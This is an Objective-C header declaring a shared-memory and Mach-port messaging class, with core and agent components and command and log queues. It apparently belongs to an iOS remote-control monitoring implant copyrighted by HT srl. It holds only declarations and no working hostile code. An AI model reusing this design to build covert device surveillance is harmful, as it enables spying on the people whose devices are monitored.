/*
 * RCSiOS - IPC through machport
 *  since shmget = ENOSYS
 *
 *
 * Created on 11/09/2009
 * Copyright (C) HT srl 2009. All rights reserved
 * Adapted from RCSMac by Massimo Chiodini on 05/03/2010
 *
 */

#import <Foundation/Foundation.h>


#ifndef __RCSISharedMemory_h__
#define __RCSISharedMemory_h__


@interface RCSISharedMemory : NSObject
{
@private
  NSString            *mFilename;
  char                *mSharedMemory;
  CFMessagePortRef    mMemPort;
  CFRunLoopSourceRef  mRLSource;
  NSMutableArray      *mRemotePorts;
  int                 mSize;
  int mFD;
  int mKey;
  int qID;
  NSMutableArray      *mCoreMessageQueue;
  NSMutableArray      *mLogMessageQueue;
}

@property (readwrite) char              *mSharedMemory;
@property (readonly)  NSString          *mFilename;
@property (readwrite) int               mSize;
@property (readonly) NSMutableArray    *mCoreMessageQueue;
@property (readonly) NSMutableArray    *mLogMessageQueue;

- (id)initWithFilename: (NSString *)aFilename
                  size: (u_int)aSize;
- (void)dealloc;

- (int)createMemoryRegion;
- (int)createMemoryRegionForAgent;
- (int)attachToMemoryRegion: (BOOL)fromScratch;
- (int)detachFromMemoryRegion;

- (BOOL)isShMemLog;
- (BOOL)isShMemCmd;
- (void)addPort: (CFMessagePortRef) port;

- (void)synchronizeRemotePort: (CFMessagePortRef)port
                   withOffset: (u_int)aOffset
                      andData: (NSData *)aData;

- (void)synchronizeShMemToPort: (CFMessagePortRef)port;
- (BOOL)synchronizeRemotePorts: (NSData *)data 
                    withOffest: (u_int)anOffset;

- (void)zeroFillMemory;
- (BOOL)clearConfigurations;

- (NSMutableData *)readMemory: (u_int)anOffset
                fromComponent: (u_int)aComponent;
- (NSMutableData *)readMemoryFromComponent: (u_int)aComponent
                                  forAgent: (u_int)anAgentID
                           withCommandType: (u_int)aCommandType;

- (BOOL)writeMemory: (NSData *)aData
             offset: (u_int)anOffset
      fromComponent: (u_int)aComponent;

- (void)runMethod: (NSDictionary *)aDict;
- (BOOL)isShMemValid;
- (BOOL)restartShMem;

//////////////////////////////////////

- (int)createCoreRLSource;
- (NSMutableArray*)fetchMessages;

+ (BOOL)sendMessageToCoreMachPort:(NSData*)aData withMode:(NSString*)aMode;
+ (BOOL)sendMessageToMachPort:(mach_port_t)port 
                     withData:(NSData *)aData;
                     
@end

#endif